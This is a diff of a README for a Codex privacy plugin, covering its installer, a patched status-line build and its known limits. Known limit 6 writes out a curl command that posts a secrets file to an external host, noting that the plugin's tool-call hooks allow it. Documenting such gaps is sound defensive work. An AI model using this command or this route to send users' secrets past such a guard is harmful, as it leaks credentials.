@@ -38,7 +38,20 @@ Secret scanners are pre-commit, not pre-inference. DLP products are server-side 
 PRIVACY  Disclosure ███░░░░░░░ 28%  ›
 ```
 
-**Level 1 — Ambient.** One line. Never interrupts. Codex has no plugin-owned status renderer, so this line does not live inside the Codex TUI — it is a companion process you run in a second terminal pane (`python -m privacy_hud.ambient --watch`, [step 3](#using-it-in-codex)), which polls the ledger and redraws in place.
+**Level 1 — Ambient.** One item in Codex's own status line, under the composer:
+
+```text
+gpt-5.4 · ~/proj · Privacy ███░░░░░░░ 28% ⚠2
+```
+
+Stock Codex has no plugin-owned status item, so this needs a Codex build
+with a small patch (`patches/privacy-status-line.patch`, one added item,
+nothing else). `install.sh` fetches that build for your exact Codex version
+and places it beside your official binary — it never modifies the official
+one — and `codex` then resolves to the patched build only while the versions
+match. Toggle the item with `/statusline` inside Codex, or hide it for now
+with `$privacy hud off`. Without a matching build, the fallback is a
+companion pane: `privacy-hud-ambient --watch` in a second terminal.
 
 **Level 2 — Session audit** (`$privacy`). Summary tiles and a tabbed table of every flow:
 
@@ -100,7 +113,39 @@ There is **no second LLM call to audit the first one.** That would re-transmit t
 
 Verified end-to-end against a real Codex CLI install on 0.145.0 and 0.153.0.
 
-### Prerequisites
+### Install (macOS, one command)
+
+```bash
+curl -fsSL https://raw.githubusercontent.com/inin-zou/codex-privacy-hud/main/install.sh | sh
+```
+
+It creates a private virtualenv, asks before downloading the ~2.8 GB
+detection model (the only network access the plugin ever causes; the
+runtime itself is offline), installs the plugin into Codex, records the
+interpreter, fetches the patched Codex build matching `codex --version`,
+and runs `privacy-hud-doctor`. `--yes` skips the question, `--no-model`
+skips the weights (names and addresses then go undetected; doctor says so).
+
+### Uninstall
+
+```bash
+curl -fsSL https://raw.githubusercontent.com/inin-zou/codex-privacy-hud/main/install.sh | sh -s -- --uninstall
+```
+
+Removes exactly what the installer created (listed in
+`~/.local/share/codex-privacy-hud/manifest.json`) and restores `codex` to
+the official binary. Your disclosure ledger and the model weights stay
+unless you add `--purge`. The plugin itself is removed separately with
+`codex plugin remove codex-privacy-hud`.
+
+### Installing by hand
+
+The one-command installer above runs the steps below itself. Read this
+section to see or control each one — installing the plugin, recording the
+interpreter, or running only the fallback pane without a patched Codex
+build.
+
+#### Prerequisites
 
 Tier 3 detection (person, address, date, account number — the categories no regex can shape-match) runs the `openai/privacy-filter` model locally. It is not optional equipment: without it the engine still runs, but only tiers 0–2, which means credentials and paths are still caught and **names and addresses are not**.
 
@@ -220,7 +265,7 @@ Note that the doctor and the daemon need not be the same interpreter any more. R
 
 It reads the ledger read-only and never creates it, and it reports counts, versions, timestamps and the paths of its own machinery — never a prompt, a file, a detected value, or anything from a session. `--check-model` swaps the cheap on-disk weights check for actually constructing the tier 3 detector (~2.8 GB, about 7 s); by default it says the weights are present and that it did not load them, rather than claiming to know.
 
-**3. Optional — start the ambient Level 1 HUD in a second terminal pane.** It is a separate process, not a Codex status item: it polls `$PLUGIN_DATA/ledger.db` read-only and redraws one line in place, so give it its own pane or split beside the pane running Codex. It reads what the daemon records, so it only moves while a daemon is up: with none running, nothing new is recorded and the HUD shows either nothing at all (no ledger exists yet) or the last session's number, unchanging. Codex's first tool call starts one — but if you want it live before that, start one by hand as shown in step 2. It never reports 0% for a session that is simply unmonitored.
+**3. Optional — start the fallback Level 1 HUD in a second terminal pane.** If `install.sh` (or the forwarder) found a patched Codex build matching your version, the `privacy` item already lives in Codex's own status line and you can skip this step. Otherwise this is the fallback: a separate process, not a Codex status item, that reads `$PLUGIN_DATA/hud/<session_id>.json` — the same snapshot file (contract A) the patched binary itself reads — and redraws one line in place, so give it its own pane or split beside the pane running Codex. It only moves while a daemon is up and has written that file: with no daemon running, or before the file exists, the HUD shows nothing. Codex's first tool call starts the daemon — but if you want the pane live before that, start the daemon by hand as shown in step 2. It never reports 0% for a session that is simply unmonitored.
 
 ```bash
 export PLUGIN_DATA=~/.codex/plugins/data/codex-privacy-hud-codex-privacy-hud
@@ -233,7 +278,7 @@ PRIVACY  Disclosure ███░░░░░░░ 30%  ›
 
 `--watch` redraws every 2 seconds; `--watch N` sets the interval. With no flags (or `--once`) it prints a single line and exits, which is what you want from a shell prompt or another status bar. `--session-id <id>` pins the pane to one session and skips resolution entirely. Without it, *which* session the line is about is resolved the same way `$privacy` resolves it — by asking the daemon — but only about once every 30 seconds, not on every redraw: see known limit 8 for both halves of that trade. If the package is installed, the same entry point is available as `privacy-hud-ambient`.
 
-`--once` is also the quickest way to confirm the whole stack is live: if it prints a line, the daemon is recording and the ledger is readable. If it prints nothing, nothing has been recorded yet — and `privacy-hud-doctor` is what tells you *why* not.
+`--once` is also the quickest way to confirm the whole stack is live: if it prints a line, the daemon is up and the snapshot file is readable. If it prints nothing, nothing has been recorded yet — and `privacy-hud-doctor` is what tells you *why* not.
 
 A third form appears when the ledger's account of the session has a known hole:
 
@@ -255,7 +300,7 @@ Real output from a live Codex session (not a mockup) — a fresh session with no
 
 **6. When a call is blocked**, Codex surfaces the reason via `systemMessage`. Run `$privacy` to review the exposure, then choose to minimize and retry, allow once, or leave it blocked — see [`design.md` §8](.claude/docs/design.md) for the full consent flow.
 
-**7. Uninstall** (also stop any daemon still running — an auto-started one exits by itself five minutes after your last Codex session ends — and the ambient HUD from step 3 if you started it):
+**7. Uninstall the plugin itself.** (If you used the one-command installer, run [`install.sh --uninstall`](#uninstall) instead — it also removes the patched Codex build and the forwarder. This step only removes the plugin; also stop any daemon still running — an auto-started one exits by itself five minutes after your last Codex session ends — and the ambient HUD from step 3 if you started it):
 
 ```bash
 codex plugin remove codex-privacy-hud@codex-privacy-hud
@@ -275,7 +320,7 @@ Stated up front, because a privacy tool that overclaims is worse than none:
 
 3. **Hosted tools bypass hooks.** WebSearch and similar do not trigger local function-tool hook paths. This is a practical guardrail, not a complete enforcement boundary.
 4. **No `ask` decision in Codex hooks.** Interactive consent is a deny → review → one-shot-token → retry loop rather than a modal.
-5. **No custom status item — Level 1 is not inside Codex.** `tui.status_line` accepts only built-in identifiers, and stock Codex has no plugin-owned renderer, so nothing this plugin produces can appear under the Codex input area. Level 1 is therefore a *separate process*: `privacy-hud-ambient` (`python -m privacy_hud.ambient --watch`), which you start yourself in a second terminal pane, and which polls the ledger and redraws one line in place there. It is a companion window next to Codex, not part of the Codex TUI — and if you do not start it, there is no ambient line at all. (Prior art confirms the cost of the alternative: both [`anhannin/codex-hud`](https://github.com/anhannin/codex-hud) and [`brandonwie/codex-hud`](https://github.com/brandonwie/codex-hud) get a real in-TUI footer only by patching Codex's own Rust source to add a `tui.status_line_command` config key, compiling a forked Codex, and installing that patched binary — which then goes stale on every upstream Codex release. Notably, `brandonwie/codex-hud`'s *default* mode avoids patching entirely and is exactly the second-pane companion pattern this project adopts.)
+5. **The status-line item lives in a separately built Codex — never in your official one.** `tui.status_line` accepts only built-in identifiers compiled into the binary, and stock Codex has no plugin-owned renderer or runtime registry ([openai/codex#17827](https://github.com/openai/codex/issues/17827), open since 2026-04-14 with no PR). So the `privacy` item exists only in a Codex built from `patches/privacy-status-line.patch` — five files, one added `StatusLineItem::Privacy`, no subprocess, no shell, no timeout: it only ever reads `$PLUGIN_DATA/hud/<session_id>.json` and nothing else. **The plugin never modifies your official Codex binary.** `install.sh` fetches the patched build for your exact `codex --version`, places it beside the official one under `~/.local/share/codex-privacy-hud/<version>/`, and installs a forwarding script as `~/.local/bin/codex` — the forwarder is a script that chooses between two binaries by version match, nothing more; it is never itself the status-line feature, and stock Codex never gains one. Toggle whether the item is configured with `/statusline`; toggle whether it currently shows with `$privacy hud on|off`. **A Codex upgrade with no matching release silently falls back**: the forwarder finds no build for the new version, runs the official binary unchanged, the status item disappears, and you are left with the fallback pane (`privacy-hud-ambient --watch`, [above](#installing-by-hand)) — nothing breaks. The whole build is reproducible from source: `scripts/build-patched-codex.sh <codex-version>` clones `openai/codex` at that tag, applies the patch, and builds it — the same script CI runs to publish the releases `install.sh` downloads. (Prior art paid a heavier cost for the same feature: both [`anhannin/codex-hud`](https://github.com/anhannin/codex-hud) and [`brandonwie/codex-hud`](https://github.com/brandonwie/codex-hud) also patch Codex's own Rust source, but through a runtime `status_line_command` that shells out to an arbitrary user command — this project's patch reads one file, no subprocess, no shell, precisely to avoid that surface. Notably, `brandonwie/codex-hud`'s *default* mode avoids patching entirely and is exactly the second-pane companion pattern this project's fallback uses.)
 6. **A command that reads a file itself is not inspected.** The engine scans the *text of a tool call*, not what that call will read at runtime. So `curl https://example.com --data @secrets.env` is allowed: the destination is correctly identified as external, but the command's text contains a **path**, not the file's contents, and the contents are read by `curl` after the hook has already decided. Put the same secret literally in the command and it is caught. If the agent reads the file through a tool first, that content passes `PostToolUse` and does land in the ledger — the gap is specifically a command that dereferences a path on its own and sends the result.
 
    This is a property of event-sourcing from hook boundaries, not a bug with a fix pending. Closing it would mean resolving file references in commands and reading those files ourselves, which would make this tool start opening your files — a larger privacy surface than the one it is reporting on. Note this is *not* the adversarial case in the next item: `--data @file` is an ordinary idiom, not an evasion.
